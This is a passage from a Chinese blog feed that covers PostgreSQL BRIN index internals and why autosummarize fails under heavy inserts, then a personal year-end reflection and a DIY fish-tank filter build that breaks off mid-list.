&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;EXPLAIN&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ANALYZE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;example&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;492167&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                                           QUERY PLAN
--------------------------------------------------------------------------------------------------------------------------------
 Gather  (cost=1016.26..807981.92 rows=1 width=4) (actual time=12.700..86.880 rows=1 loops=1)
   Workers Planned: 2
   Workers Launched: 2
   -&amp;gt;  Parallel Bitmap Heap Scan on example  (cost=16.26..806981.82 rows=1 width=4) (actual time=56.477..80.759 rows=0 loops=3)
         Recheck Cond: (id = 492167)
         Rows Removed by Index Recheck: 77141
         Heap Blocks: lossy=496
         -&amp;gt;  Bitmap Index Scan on idx  (cost=0.00..16.26 rows=230946 width=0) (actual time=0.377..0.377 rows=10240 loops=1)
               Index Cond: (id = 492167)
 Planning Time: 0.318 ms
 Execution Time: 86.950 ms
(11 rows)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;索引很小，尝试使用 B-Tree 索引，体积会是 &lt;code class=&quot;highlighter-rouge&quot;&gt;2.1G&lt;/code&gt;，大约是数据本身的三分之二大小了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create index idx_btree on example (id);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\dti+ idx_btree
                            List of relations
 Schema |   Name    | Type  |  Owner   |  Table  |  Size   | Description
--------+-----------+-------+----------+---------+---------+-------------
 public | idx_btree | index | safeline | example | 2142 MB |
(1 row)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;brin-索引结构&quot;&gt;BRIN 索引结构&lt;/h2&gt;

&lt;p&gt;BRIN 索引页的存储顺序依次是 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;regular pages&lt;/code&gt;。我们通过 &lt;a href=&quot;https://www.postgresql.org/docs/current/pageinspect.html#id-1.11.7.31.6&quot;&gt;pageinspect&lt;/a&gt; 扩展可以很方便地分析 BRIN 索引的各个页。&lt;/p&gt;

&lt;h3 id=&quot;meta-page&quot;&gt;meta page&lt;/h3&gt;

&lt;p&gt;第一页 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt; 保存 BRIN 索引的元数据&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from brin_metapage_info(get_raw_page('idx', 0));

   magic    | version | pagesperrange | lastrevmappage
------------+---------+---------------+----------------
 0xA8109CFA |       1 |          1024 |              1
(1 row)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;lastrevmapage&lt;/code&gt; 表示 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt; 最后一页的下标，即从 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt; 的下一页到 &lt;code class=&quot;highlighter-rouge&quot;&gt;lastrevmapage&lt;/code&gt; 都是 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;revmap-pages&quot;&gt;revmap pages&lt;/h3&gt;

&lt;p&gt;接下来的 revmap 相当于一个目录，保存数据块到索引记录的映射关系，而且每一页 revmap 的记录数是固定的。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_revmap_data(get_raw_page('idx', 1)) LIMIT 5;

 pages
-------
 (2,1)
 (2,2)
 (2,3)
 (2,4)
 (2,5)
(5 rows)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/postgres/postgres/blob/master/src/backend/access/brin/brin_revmap.c&quot;&gt;下面的宏&lt;/a&gt;可以计算出一个数据块在 revmap 中的位置，然后可以在 revmap 中查询到索引的位置。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;#define HEAPBLK_TO_REVMAP_BLK(pagesPerRange, heapBlk) \
	((heapBlk / pagesPerRange) / REVMAP_PAGE_MAXITEMS)
#define HEAPBLK_TO_REVMAP_INDEX(pagesPerRange, heapBlk) \
	((heapBlk / pagesPerRange) % REVMAP_PAGE_MAXITEMS)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以在扫描和更新索引时（比如 &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin.c#L188&quot;&gt;brininsert&lt;/a&gt; 等函数），可以简单的计算出一个数据块属于哪一条索引记录&lt;sup&gt;[2]&lt;/sup&gt;。&lt;/p&gt;

&lt;p&gt;如果对应块索引还未被创建，那么该项就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;(0, 0)&lt;/code&gt;。随着表数据行和索引记录的不断增加，索引的 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt; 也会向后扩展，为了给这腾出位置，PostgreSQL 会从前面开始将 &lt;code class=&quot;highlighter-rouge&quot;&gt;regular pages&lt;/code&gt; 中的索引条目移到末尾，并更新和拓展 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;regular-page&quot;&gt;regular page&lt;/h3&gt;

&lt;p&gt;可以通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;brin_page_items&lt;/code&gt; 查看索引记录&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_page_items(get_raw_page('idx', 2), 'idx') LIMIT 5;

 itemoffset | blknum | attnum | allnulls | hasnulls | placeholder |        value
------------+--------+--------+----------+----------+-------------+---------------------
          1 |      0 |      1 | f        | f        | f           | {1 .. 231424}
          2 |   1024 |      1 | f        | f        | f           | {231425 .. 462848}
          3 |   2048 |      1 | f        | f        | f           | {462849 .. 694272}
          4 |   3072 |      1 | f        | f        | f           | {694273 .. 925696}
          5 |   4096 |      1 | f        | f        | f           | {925697 .. 1157120}
(5 rows)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;blknum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;attnum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;allnulls&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;hasnulls&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;value&lt;/code&gt; 分别表示起始块数、字段下标、是否全为空值、是否存在空值和块范围内字段的最大最小值。这其中最重要的就是 value 这个字段了。PostgreSQL 就是根据这个 value 值来判断是否需要扫描这些数据块。以第三个条目为例，它的 &lt;code class=&quot;highlighter-rouge&quot;&gt;blknum&lt;/code&gt; 为 2048，说明是 2048 - 3072 数据块存储的数据范围是 &lt;code class=&quot;highlighter-rouge&quot;&gt;462849 .. 694272&lt;/code&gt;。如果我们查询的 SQL 是 &lt;code class=&quot;highlighter-rouge&quot;&gt;WHERE id = 492167&lt;/code&gt;，那在这些数据块中再搜索就足够了。&lt;/p&gt;

&lt;p&gt;BRIN 索引的 &lt;code class=&quot;highlighter-rouge&quot;&gt;pages_per_range&lt;/code&gt; 可指定单条索引记录所统计的数据块范围，默认为 128。值越小统计的粒度就越小，索引的过滤性越好，但索引也会越大。由于每筛选一次字段 PostgreSQL 都要扫描全部的 BRIN 索引，所花费的时间也会变长，因此需要根据表的大小与应用场景去调整其值的大小。&lt;/p&gt;

&lt;p&gt;当一些在索引条目边界的行被删除时，会使原有的索引条目失效，失效的索引条目需要重新统计。也可以通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;brin_desummarize_range&lt;/code&gt; 手动将一些索引条目失效。&lt;/p&gt;

&lt;h2 id=&quot;我们遇到的问题&quot;&gt;我们遇到的问题&lt;/h2&gt;

&lt;p&gt;我们有一张日志表需要不断插入大量请求日志，在用户浏览日志列表或是查看日志详情时需要进行等值或范围查询，起初在对 BRIN 索引进行测试时，先对日志表插入大量数据再建立索引进行查询，或是将之前归档的日志数据恢复再进行查询均有着不错的性能表现，但再进一步使用真实场景测试一段时间后发现日志查询变得非常慢，和之前的结果相差甚远。&lt;/p&gt;

&lt;h3 id=&quot;只要数据插入足够快索引就跟不上我&quot;&gt;只要数据插入足够快，索引就跟不上我&lt;/h3&gt;

&lt;p&gt;PostgreSQL 在插入或更新行时会更新已存在的索引条目，对应的索引条目不存在时则跳过。而在 &lt;code class=&quot;highlighter-rouge&quot;&gt;vacuum&lt;/code&gt; 或显式调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;brin_summarize_new_values&lt;/code&gt; 时才会为表中未统计的数据块新增索引条目。从 PostgreSQL 10 开始新增 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 参数，开启 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 后，当表不断被插入新的行导致新增的数据块大于 &lt;code class=&quot;highlighter-rouge&quot;&gt;pages_per_range&lt;/code&gt; 时，将会自动统计这些新增的数据块并为此插入新的索引条目。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 并不会立即开始且都会成功，它尝试在 &lt;code class=&quot;highlighter-rouge&quot;&gt;AutoAacuumWork&lt;/code&gt; 的请求队列中追加一项 &lt;code class=&quot;highlighter-rouge&quot;&gt;AVW_BRINSummarizeRange&lt;/code&gt; 的任务，而这个任务便是调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;summarize_range&lt;/code&gt; 函数&lt;sup&gt;[3]&lt;/sup&gt;。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;if (!lastPageTuple)
{
    bool		recorded;

    recorded = AutoVacuumRequestWork(AVW_BRINSummarizeRange,
                                        RelationGetRelid(idxRel),
                                        lastPageRange);
    if (!recorded)
        ereport(LOG,
                (errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),
                    errmsg(&quot;request for BRIN range summarization for index \&quot;%s\&quot; page %u was not recorded&quot;,
                        RelationGetRelationName(idxRel),
                        lastPageRange)));
}
else
    LockBuffer(buf, BUFFER_LOCK_UNLOCK);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;请求队列的长度 &lt;code class=&quot;highlighter-rouge&quot;&gt;NUM_WORKITEMS&lt;/code&gt; 是固定的，默认为 256。在 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum_work&lt;/code&gt; 执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;do_autovacuum&lt;/code&gt; 时处理这些任务&lt;sup&gt;[4]&lt;/sup&gt;。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;/*
 * Perform additional work items, as requested by backends.
 */
LWLockAcquire(AutovacuumLock, LW_EXCLUSIVE);
for (i = 0; i &amp;lt; NUM_WORKITEMS; i++)
{
    AutoVacuumWorkItem *workitem = &amp;amp;AutoVacuumShmem-&amp;gt;av_workItems[i];

    if (!workitem-&amp;gt;avw_used)
        continue;
    if (workitem-&amp;gt;avw_active)
        continue;
    if (workitem-&amp;gt;avw_database != MyDatabaseId)
        continue;

    /* claim this one, and release lock while performing it */
    workitem-&amp;gt;avw_active = true;
    LWLockRelease(AutovacuumLock);

    perform_work_item(workitem);

    /*
     * Check for config changes before acquiring lock for further jobs.
     */
    CHECK_FOR_INTERRUPTS();
    if (got_SIGHUP)
    {
        got_SIGHUP = false;
        ProcessConfigFile(PGC_SIGHUP);
    }

    LWLockAcquire(AutovacuumLock, LW_EXCLUSIVE);

    /* and mark it done */
    workitem-&amp;gt;avw_active = false;
    workitem-&amp;gt;avw_used = false;
}
LWLockRelease(AutovacuumLock);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当前 &lt;code class=&quot;highlighter-rouge&quot;&gt;AutoVacuumWorkItemType&lt;/code&gt; 只有 &lt;code class=&quot;highlighter-rouge&quot;&gt;AVW_BRINSummarizeRange&lt;/code&gt; 这一种，在 PostgreSQL 未来的版本很可能会继续使用这一框架，新增更多来自 backend 的任务类型。&lt;/p&gt;

&lt;p&gt;当请求队列已满且 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum_work&lt;/code&gt; 来不及处理时 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 就会失败。只要数据插入足够快，索引就跟不上我，所以即便是开启了 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt;，在大量数据被不断插入表中的情况下，请求队列会被迅速占满，导致 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 失败，出现大量错误日志：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;XXXX-XX-XX 09:39:55.832 UTC [67] LOG:  request for BRIN range summarization for index &quot;idx&quot; page 58311 was not recorded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;BRIN 索引需要定期被更新，否则就可能存在大量还未索引的记录，还有数据更新也导致一些索引条目失效或统计出现偏差。在 BRIN 索引不完整时过滤性能变差，无论查询的记录是否在已存在的索引条目中，在 Heap bitmap index scan 之后仍需要重新 Recheck 未统计的数据块，速度可能会变得非常缓慢，从原来的十几毫秒延长到几秒是有可能的，进而影响相关的业务系统。下面是一个比较极端的情况下的查询。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;

                                                       QUERY PLAN
-------------------------------------------------------------------------------------------------------------------------
 Bitmap Heap Scan on example  (cost=12.03..50726.88 rows=1 width=37) (actual time=19.317..6047.938 rows=1900 loops=1)
   Recheck Cond: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
   Rows Removed by Index Recheck: 39598741
   Heap Blocks: lossy=330006
   Buffers: shared hit=1 read=330007
   -&amp;gt;  Bitmap Index Scan on idx  (cost=0.00..12.03 rows=15355 width=0) (actual time=19.085..19.085 rows=3301120 loops=1)
         Index Cond: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
         Buffers: shared hit=1 read=1
 Planning Time: 0.782 ms
 Execution Time: 6048.140 ms
(10 rows)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对比使用 Parallel Seq Scan 的查询：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;

                                                          QUERY PLAN
------------------------------------------------------------------------------------------------------------------------------
 Gather  (cost=1000.00..584334.60 rows=1 width=37) (actual time=1.751..1645.756 rows=1900 loops=1)
   Workers Planned: 2
   Workers Launched: 2
   Buffers: shared hit=16219 read=317115
   -&amp;gt;  Parallel Seq Scan on example  (cost=0.00..583334.50 rows=1 width=37) (actual time=1089.990..1635.938 rows=633 loops=3)
         Filter: ((id &amp;gt; 100) AND (id &amp;lt;= 2000))
         Rows Removed by Filter: 13332700
         Buffers: shared hit=16219 read=317115
 Planning Time: 0.659 ms
 Execution Time: 1646.008 ms
(10 rows)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;autovacuum-为什么也没用&quot;&gt;autovacuum 为什么也没用&lt;/h3&gt;

&lt;p&gt;上面一节提到了问题可能是 &lt;code class=&quot;highlighter-rouge&quot;&gt;AutoAacuumWork&lt;/code&gt; 队列已满，但是日常运行的 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 也应该可以实现相同的效果，为什么也没用呢。为了方便测试，我们可单独将表运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 的相关阈值调低，其他保持则默认值：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ALTER TABLE example SET (autovacuum_vacuum_scale_factor = 0.0);
ALTER TABLE example SET (autovacuum_vacuum_threshold = 100);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;然后根据我们的业务场景，不断在表中插入大量数据，然后观察 &lt;code class=&quot;highlighter-rouge&quot;&gt;pg_stat_user_tables&lt;/code&gt; 中记录：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;safeline=# SELECT * FROM pg_stat_user_tables where relname = 'example';

-[ RECORD 1 ]-------+------------------------------
relid               | 32824
schemaname          | public
relname             | example
seq_scan            | 81
seq_tup_read        | 202398405
idx_scan            | 5
idx_tup_fetch       | 198003205
n_tup_ins           | 110000010
n_tup_upd           | 0
n_tup_del           | 0
n_tup_hot_upd       | 0
n_live_tup          | 110000000
n_dead_tup          | 0
n_mod_since_analyze | 0
last_vacuum         |
last_autovacuum     |
last_analyze        |
last_autoanalyze    | xxxx-xx-xx 08:31:25.114953+00
vacuum_count        | 0
autovacuum_count    | 0
analyze_count       | 0
autoanalyze_count   | 3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;last_autovacuum&lt;/code&gt; 一直为空，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;autoanalyze&lt;/code&gt; 能够预期地按照一定频率运行。原来在 &lt;code class=&quot;highlighter-rouge&quot;&gt;do_autovacuum&lt;/code&gt; 函数执行时，大致可分为 &lt;code class=&quot;highlighter-rouge&quot;&gt;dovacuum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;doanalyze&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;doworkitems&lt;/code&gt; 等过程，而其中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;relation_needs_vacanalyze&lt;/code&gt; 函数将判断关系表是否需要做 &lt;code class=&quot;highlighter-rouge&quot;&gt;vacuum&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;analyze&lt;/code&gt;。在仅插入的场景下，表的 &lt;code class=&quot;highlighter-rouge&quot;&gt;n_dead_tup&lt;/code&gt; 很小（本例中没有行被更新或删除，&lt;code class=&quot;highlighter-rouge&quot;&gt;n_dead_tup&lt;/code&gt; 为 0），如果只调整 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 的运行频率等配置，&lt;code class=&quot;highlighter-rouge&quot;&gt;dovacuum&lt;/code&gt; 也可能不会被触发。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A table needs to be vacuumed if the number of dead tuples exceeds a threshold.  This threshold is calculated as&lt;/p&gt;

  &lt;p&gt;threshold = vac_base_thresh + vac_scale_factor * reltuples&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;当然，前面说明了 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 需要依赖 &lt;code class=&quot;highlighter-rouge&quot;&gt;do_autovacuum&lt;/code&gt; 中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;doworkitems&lt;/code&gt; 来进行处理，如果 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 没有运行，则 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 也是无效的。&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;[1]: &lt;a href=&quot;https://mp.weixin.qq.com/s/4MF9yMzoJQdk0Qa4jw2xSQ&quot;&gt;PostgreSQL中BRIN和BTREE索引的比较&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;[2]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin_revmap.c#L197&quot;&gt;GitHub - brin_revmap.c&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/access/brin/brin.c#L190&quot;&gt;GitHub - brin.c&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/postgres/postgres/blob/322548a8abe225f2cfd6a48e07b99e2711d28ef7/src/backend/postmaster/autovacuum.c#L2559&quot;&gt;GitHub - autovacuum.c&lt;/a&gt;&lt;/p&gt;</content><author><name>MonoUno</name></author><category term="后端" /><summary type="html">作者：@monouno，现实习于长亭科技。原文发表在 https://zhuanlan.zhihu.com/p/50167673</summary></entry><entry><title type="html">mv 2018 2019</title><link href="https://strcpy.me/index.php/archives/792/" rel="alternate" type="text/html" title="mv 2018 2019" /><published>2019-01-26T00:00:01+00:00</published><updated>2019-01-26T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/2018</id><content type="html" xml:base="https://strcpy.me/index.php/archives/792/">&lt;p&gt;这是一篇迟到的简短的文章。&lt;/p&gt;

&lt;p&gt;一转眼，2018 年就过去了，回想一下，有些碌碌无为。&lt;/p&gt;

&lt;p&gt;工作上，差强人意吧，很难跳出自己的舒适区去做一些更感兴趣和更有挑战性的事情。成长的速度低于预期，有时候也需要多去看看同龄人、搞同样方向的人都在做什么、有什么成果。不管做什么事情都要有明确的目标，然后尽快开始。&lt;/p&gt;

&lt;p&gt;年底互联网的几波裁员潮和不太乐观的经济形势让很多人比较慌，对于公司来说，缺了任何一个人都可以继续工作，所以完善个人竞争力是重中之重。当然经济形势的问题也影响很多生活上的选择，在新的一年里，也应该有自己的判断，应该做什么，不应该做什么。&lt;/p&gt;

&lt;p&gt;生活上，一如既往，和孙同学还不错，得考虑下下一步的计划了。还有就是不能太宅了，得多出去走走。&lt;/p&gt;

&lt;p&gt;在厨艺上，这一年有挺大的进步，有过比较多的尝试，在下厨房上都有分享。&lt;/p&gt;

&lt;p&gt;养了两只巴西龟，一只爱吃爱活动长得快的，一只不爱动不太吃得了肺炎最终死了。。还有十多条小金鱼，为了它们还 DIY 了一个过滤。&lt;/p&gt;

&lt;p&gt;这几天换了房子，隔壁的哥们去杭州了，我就租下了他的房子，他还送了我们一堆不带走的东西，虽然是捡破烂，但是也很高兴，哈哈哈。住了两年多暗无天日的朝北的房子，清晨的阳光照进屋子里面的时候，竟然还有些激动，同样激动的还有大龟龟。当然搬家和收拾屋子确实挺累的，屋子虽然小，但是东西是绝对的多。&lt;/p&gt;

&lt;p&gt;大概前几年打球跑步导致的吧，去拍了个核磁，膝关节半月板轻度损伤，带来的就是走路多了之后膝盖疼，通过针对性的训练之后有所缓解，不太想这么年轻就“残疾”了。。&lt;/p&gt;

&lt;p&gt;目标&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一定要跳出工作的舒适区&lt;/li&gt;
  &lt;li&gt;多看书，专业有关的无关的&lt;/li&gt;
  &lt;li&gt;攒钱，然后决定买房子还是囤现金过冬天&lt;/li&gt;
  &lt;li&gt;健身锻炼&lt;/li&gt;
&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="生活" /><summary type="html">这是一篇迟到的简短的文章。</summary></entry><entry><title type="html">DIY 了鱼缸过滤</title><link href="https://strcpy.me/index.php/archives/791/" rel="alternate" type="text/html" title="DIY 了鱼缸过滤" /><published>2018-11-23T12:46:07+00:00</published><updated>2018-11-23T12:46:07+00:00</updated><id>https://strcpy.me/index.php/archives/DIY%20%E4%BA%86%E9%B1%BC%E7%BC%B8%E8%BF%87%E6%BB%A4</id><content type="html" xml:base="https://strcpy.me/index.php/archives/791/">&lt;p&gt;前几个月妹子买了两只小龟，是密西西比红耳龟，国内一般称巴西龟，淘宝上小苗子一般几块钱一只。我之后又买了一些草金鱼，一开始是 20 多条，除去陆续死掉的和看样子不大行喂了龟的，现在还剩一半，已经一段时间没有死过了。&lt;/p&gt;

&lt;p&gt;我是使用两个收纳箱当鱼缸的，尺寸都是 40 cm * 20 cm * 30 cm，受制于空间，两个缸是靠在一起的，周围几乎没有别的空间了。&lt;/p&gt;

&lt;p&gt;为了给龟儿子和小鱼鱼营造一个好一些的生活环境，也为了保持水质，防止散发气味，我开始了解鱼缸过滤，搜了一下淘宝，一般这种小型的鱼缸加紧凑空间会使用上部滴流过滤，而淘宝上的并不是太满足我两个缸同时使用的需求，不太方便接入两根进水管和两根出水管，所以经过思考，决定自己 DIY 一个。&lt;/p&gt;

&lt;p&gt;下图是淘宝上的滴流盒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;材料&quot;&gt;材料&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;潜水泵，鱼缸使用带加氧功能的侧吸泵，龟缸使用普通底吸泵；配套软管，软管的尺寸也影响后续的部件尺寸，我用了大约一米长的四分管&lt;/li&gt;
  &lt;li&gt;方形密封饭盒一个&lt;/li&gt;
  &lt;li&gt;水箱接头四个，弯头两个（一头螺纹一头软管缩头），两个直转接头（同前一个）&lt;/li&gt;
  &lt;li&gt;其他工具和零部件，比如饭盒上打孔的电钻和开孔器、美工刀、钳子和铁丝等，这些我家里都有，就没有再买&lt;/li&gt;
  &lt;li&gt;过滤材料，包括过滤棉、过滤布（300目）和细菌屋等&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;制作步骤&quot;&gt;制作步骤&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;饭盒盖子和底部各打两个孔，同一面的孔靠近同一个边，然后盖上盖子的时候，进水口和出水口错开，增加水在盒子里面的流动距离。&lt;/li&gt;
  &lt;li&gt;连接相关的零件和管子，安放盒子在两个缸中间，使用软管帮助固定。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;过滤材料的放置&quot;&gt;过滤材料的放置&lt;/h2&gt;

&lt;p&gt;一块过滤棉，大约盒子的二分之一大小，然后下面垫过滤布，用盒子盖压住过滤布，清理的时候，打开盖子去除过滤布清洗就可以了。如果没有过滤布，残渣仍然有可能被水冲回缸里面。&lt;/p&gt;

&lt;p&gt;过滤布下面就是细菌屋了，培养硝化细菌的，我的饭盒比较小，只能放三块，我觉得聊胜于无吧。&lt;/p&gt;

&lt;h2 id=&quot;存在的问题&quot;&gt;存在的问题&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;最明显的问题，就是一个泵在使用的时候，水会流到另外一个缸里面的，尤其是龟缸是加热恒温25度的，鱼缸是不加热的。其实我一开始还买了两个阀门，两端都是连接软管的，但是后来发现，这个阀门流量太小了，很容易造成盒子内积水和溢出，就暂时去掉了，在使用的时候，手动使用一个阀门堵住另外一根出水管。&lt;/li&gt;
